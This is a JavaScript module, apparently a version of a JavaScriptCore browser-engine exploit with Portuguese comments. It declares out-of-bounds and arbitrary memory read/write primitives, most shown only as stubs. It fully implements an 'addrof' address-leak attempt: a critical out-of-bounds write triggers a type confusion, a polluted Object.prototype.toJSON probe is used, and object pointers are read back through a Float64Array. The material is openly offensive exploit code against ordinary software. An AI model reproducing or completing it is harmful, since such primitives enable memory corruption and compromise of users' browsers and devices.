// js/core_exploit.mjs (v31.R22 - Sonda Addrof com flag de contexto mais precisa)

import { AdvancedInt64, isAdvancedInt64Object, PAUSE, toHex } from './utils.mjs';
import { logS3 as log } from './script3/s3_utils.mjs'; 
import { OOB_CONFIG, JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';

export let oob_array_buffer_real = null;
export let oob_dataview_real = null;
let isOOBEnvironmentSetup = false; 

const toHexHelper = (val, bits = 32) => toHex(val, bits);

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58; 
const HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET = 0x7C; 

const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET; 
const OOB_DV_M_LENGTH_OFFSET_FOR_DV_STRUCT = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET; 
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

// Funções de gerenciamento OOB (sem alterações da R21)
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false, caller_fname: "Unknown" }) { /* ... */ }
export function getOOBAllocationSize() { /* ... */ }
export function getBaseOffsetInDV() { /* ... */ }
export function getInitialBufferSize() { /* ... */ }
export async function triggerOOB_primitive(options = { force_reinit: false, caller_fname: "Unknown" }) { /* ... (sem alterações da R21) ... */ }
export function oob_read_absolute(offset_in_oob_buffer, byteLength) { /* ... (sem alterações) ... */ }
export function oob_write_absolute(offset_in_oob_buffer, value, byteLength) { /* ... (sem alterações) ... */ }
export function isOOBReady(caller_fname = "Unknown") { /* ... (sem alterações da R21, com logging detalhado) ... */ }
async function _perform_explicit_dv_reset_after_arb_op(fname_parent_for_log) { /* ... */ }
export async function arb_read(absolute_address, byteLength) { /* ... */ }
export async function arb_write(absolute_address, value, byteLength) { /* ... */ }
export async function selfTestOOBReadWrite(logFnParam) { /* ... */ }

const HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC = HEISENBUG_TARGET_MLENGTH_EFFECTIVE_OFFSET; 
const HEISENBUG_CRITICAL_WRITE_VALUE = 0xFFFFFFFF;
const HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE = 8;    

export async function selfTestTypeConfusionAndMemoryControl(logFnParam) { /* ... */ }

// Variáveis para attemptAddrofUsingCoreHeisenbug (R22)
let _targetObjectForCoreAddrof_R22 = null; 
let _core_addrof_tc_confirmed_this_run_R22 = false;
let _core_victim_float_view_for_addrof_R22 = null; 
let _core_addrof_probe_is_expecting_M2_R22 = false; // Flag para a sonda saber quando agir

function _toJSONProbeForCoreAddrof_R22() { 
    const FNAME_PROBE = "CoreExploit._toJSONProbeForCoreAddrof_R22";
    let currentThisType = Object.prototype.toString.call(this);
    
    // Log detalhado para cada chamada da sonda
    log(`[${FNAME_PROBE}] Call. 'this' type: ${currentThisType}. Expecting M2? ${_core_addrof_probe_is_expecting_M2_R22}. TC Confirmed this run? ${_core_addrof_tc_confirmed_this_run_R22}`, "leak");

    // Ação principal da sonda:
    // 1. Estávamos esperando o M2 confuso (_core_addrof_probe_is_expecting_M2_R22 é true)?
    // 2. O 'this' atual é de fato um [object Object] (indicando TC)?
    // 3. A TC principal para esta execução de attemptAddrof ainda não foi processada (_core_addrof_tc_confirmed_this_run_R22 é false)?
    if (_core_addrof_probe_is_expecting_M2_R22 && currentThisType === '[object Object]' && !_core_addrof_tc_confirmed_this_run_R22) { 
        log(`[${FNAME_PROBE}] TC CONFIRMADA para o primeiro [object Object] esperado (M2)! Escrevendo targetObject...`, "vuln");
        _core_addrof_tc_confirmed_this_run_R22 = true; // Marca que a TC principal foi processada
        _core_addrof_probe_is_expecting_M2_R22 = false;  // Para de esperar M2 nesta execução de stringify

        if (_targetObjectForCoreAddrof_R22 && _core_victim_float_view_for_addrof_R22) {
            try {
                _core_victim_float_view_for_addrof_R22[0] = _targetObjectForCoreAddrof_R22;
                log(`[${FNAME_PROBE}] targetObject escrito em _core_victim_float_view_for_addrof_R22[0].`, "info");
            } catch (e_write) { 
                log(`[${FNAME_PROBE}] ERRO ao escrever targetObject: ${e_write.message}`, "error");
                _core_addrof_tc_confirmed_this_run_R22 = false; // Invalida se a escrita falhar
            }
        } else { 
            log(`[${FNAME_PROBE}] AVISO: _targetObjectForCoreAddrof_R22 ou _core_victim_float_view_for_addrof_R22 não definidos.`, "warn");
            _core_addrof_tc_confirmed_this_run_R22 = false; 
        }
    } else if (_core_addrof_probe_is_expecting_M2_R22 && currentThisType !== '[object Object]') {
        // Se ainda estamos esperando o M2 confuso, mas 'this' não é [object Object] (pode ser M1 ou outro),
        // continuamos esperando. O M2 deve ser o próximo objeto na serialização após M1.
        log(`[${FNAME_PROBE}] Esperando M2 confuso, mas 'this' atual é ${currentThisType}. Flag de expectativa mantida.`, "info");
    }
    // Retorno simples para não interferir mais com JSON.stringify, a menos que necessário.
    return { core_addrof_probe_r22_executed: true, this_type_was: currentThisType };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) { // MODIFICADO PARA R22
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug_R22";
    log(`[${FNAME_FUNC}] Iniciando tentativa de addrof R22...`, "info");

    _targetObjectForCoreAddrof_R22 = targetObject; 
    _core_addrof_tc_confirmed_this_run_R22 = false; 
    _core_victim_float_view_for_addrof_R22 = null;
    _core_addrof_probe_is_expecting_M2_R22 = false; // Garantir reset

    let addrof_result = { success: false, message: "Addrof (Heisenbug R22) não iniciado.", leaked_address_as_int64: null, leaked_address_as_double: null };
    let originalToJSON_R22 = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCore_R22 = false;

    try {
        await triggerOOB_primitive({ force_reinit: true, caller_fname: FNAME_FUNC }); 
        await PAUSE(50); 
        if (!isOOBReady(FNAME_FUNC)) { throw new Error("Ambiente OOB não pôde ser inicializado para Addrof R22."); }
        log(`[${FNAME_FUNC}] Ambiente OOB pronto. Escrevendo valor crítico...`, "info");

        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_FOR_TC, HEISENBUG_CRITICAL_WRITE_VALUE, 4);
        await PAUSE(150); 

        let core_victim_buffer_local = new ArrayBuffer(HEISENBUG_ADDROF_VICTIM_BUFFER_SIZE); 
        _core_victim_float_view_for_addrof_R22 = new Float64Array(core_victim_buffer_local); 
        _core_victim_float_view_for_addrof_R22.fill(0.2222222222); 
        
        let core_m2_victim_local_obj = { m2_marker_field_r22: "TARGET_M2_R22" }; // Apenas um objeto simples
        let core_m1_victim = { payload_m2_R22: core_m2_victim_local_obj }; // M1 contém M2
        log(`[${FNAME_FUNC}] Estrutura M1/M2 criada.`, "info");
        
        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForCoreAddrof_R22, writable: true, configurable: true, enumerable: false });
        pollutedByCore_R22 = true;
        
        _core_addrof_probe_is_expecting_M2_R22 = true; // SINALIZA para a sonda que a próxima TC em [object Object] é o M2
        JSON.stringify(core_m1_victim); 
        // Após stringify, _core_addrof_probe_is_expecting_M2_R22 já deve ter sido setado para false pela sonda se ela encontrou o M2.
        // Se não encontrou, limpamos aqui para garantir.
        _core_addrof_probe_is_expecting_M2_R22 = false; 

        log(`[${FNAME_FUNC}] JSON.stringify concluído. TC Confirmada (Flag Interna): ${_core_addrof_tc_confirmed_this_run_R22}`, "info");
        
        if (_core_addrof_tc_confirmed_this_run_R22) { // Verifica se a sonda confirmou a TC e a escrita
            const val_double = _core_victim_float_view_for_addrof_R22[0]; 
            addrof_result.leaked_address_as_double = val_double;
            const temp_buf = new ArrayBuffer(8); new Float64Array(temp_buf)[0] = val_double;
            const temp_u32_view = new Uint32Array(temp_buf);
            const leaked_addr64 = new AdvancedInt64(temp_u32_view[0], temp_u32_view[1]);
            addrof_result.leaked_address_as_int64 = leaked_addr64;
            log(`[${FNAME_FUNC}] Heisenbug TC INTERNA e ESCRITA CONFIRMADAS! Lido: Dbl=${val_double}, I64=${leaked_addr64.toString(true)}`, "vuln");

            if (val_double !== 0.2222222222 && (leaked_addr64.low() !== 0 || leaked_addr64.high() !==0) ) {
                const lhi = leaked_addr64.high(); const nan_inf = (lhi >= 0x7FF00000 && lhi < 0x80000000) || (lhi >= 0xFFF00000 && lhi < 0x100000000);
                if (!nan_inf) { addrof_result.success = true; addrof_result.message = `Addrof R22 TC OK. Addr Pot: ${leaked_addr64.toString(true)}`; }
                else { addrof_result.message = `Addrof R22 TC OK, mas val ${leaked_addr64.toString(true)} é NaN/Inf.`;}
            } else { addrof_result.message = `Addrof R22 TC OK, mas val (${leaked_addr64.toString(true)}) é preenchimento/0.`;}
        } else { addrof_result.message = "Heisenbug TC INTERNA NÃO confirmada/processada pela sonda R22."; }
    } catch (e) { 
        log(`[${FNAME_FUNC}] EXCEPTION CATCH GERAL: ${e.message || String(e)}`, "critical");
        addrof_result.message = `Erro crítico em Addrof R22: ${e.message || String(e)}`; 
    } 
    finally {
        if (pollutedByCore_R22) { if (originalToJSON_R22) Object.defineProperty(Object.prototype, 'toJSON', originalToJSON_R22); else delete Object.prototype.toJSON; }
        _targetObjectForCoreAddrof_R22 = null; _core_victim_float_view_for_addrof_R22 = null; 
        _core_addrof_probe_is_expecting_M2_R22 = false; 
    }
    log(`[${FNAME_FUNC}] Retornando resultado Addrof R22: ${JSON.stringify(addrof_result)}`, addrof_result.success ? "good" : "warn");
    return addrof_result;
}

// Funções restantes (getStableConfusedArrayBuffer, etc.) como na R19/R18
export async function getStableConfusedArrayBuffer() { /* ... */ }
export async function get_powerful_dataview_on_oob_buffer() { /* ... */ }
export function read_memory_with_dataview(dv, dv_base_address, target_address, num_bytes, littleEndian = true) { /* ... */ }
export function write_memory_with_dataview(dv, dv_base_address, target_address, value, num_bytes, littleEndian = true) { /* ... */ }
